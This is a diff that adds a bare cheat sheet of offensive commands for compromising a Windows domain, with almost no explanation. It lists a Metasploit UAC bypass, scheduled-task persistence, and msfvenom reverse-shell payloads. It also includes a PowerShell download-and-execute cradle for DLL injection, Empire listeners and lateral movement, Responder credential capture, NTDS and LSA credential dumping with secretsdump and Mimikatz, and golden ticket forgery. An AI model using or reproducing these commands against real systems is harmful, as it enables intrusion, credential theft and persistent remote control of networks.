@@ -1,0 +1,47 @@
+
+meterpreter > background
+msf exploit(psexec) > use exploit/windows/local/bypassuac
+msf exploit(bypassuac) > set session 2
+msf exploit(bypassuac) > exploit
+at date:time /interactive cmd
+getuid
+schtasks /Create /SC DAILY /TN hacking /TR cmd.exe /st time
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<attackerIP>lport=<Attackerport> -f dll > /root/Desktop/Inject.dll 
+meterpreter > upload inject.dll
+root@kali:~# service apache2 start
+root@kali:~# wget  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
+root@kali:~# mv Invoke-DllInjection.ps1 /var/www/html/
+IEX (New-Object Net.WebClient).DownloadString('http://<HostingIP>/Invoke-DllInjection.ps1') Invoke-DllInjection -ProcessID xxx c:\<location>\injection.dll
+git clone https://github.com/EmpireProject/Empire
+cd Empire/
+cd setup
+./install.sh
+Listeners
+(Empire: listeners/http) > set Port 8080
+(Empire: listeners/http) > execute
+[*] Starting listener 'http'
+[+] Listener successfully started!
+(Empire: listeners/http) > launcher powershell  
+interact "name of the agent"
+bypassuac http
+responder -I eth0 
+responder -I eth0 -wrFb
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.119 LPORT=6200 -f exe > newpay.exe  
+Usemodule situational_awareness/network/powerview/get_group_member  
+use lateral_movement/invoke_wmi
+set Listener <listenername>
+set ComputerName Metasploitable(Domain Controller name)
+execute  
+interact <agentname>
+use powershell/situational_awareness/network/powerview/get_group_member
+execute  
+usemodule situational_awareness/network/powerview/get_loggedOn
+execute
+Ntdsutil "ac I ntds""ifm""create full c:\temp" q q  
+secretsdump.py -system <systemregistry> -security <securityregistry> -ntds <location of ntds"LOCAL"
+Mimikatz
+      privilege::debug
+    lsassdump::lsa /inject
+usemodule credentials/mimikatz/golden_ticket
+set user <domain user>
+execute  
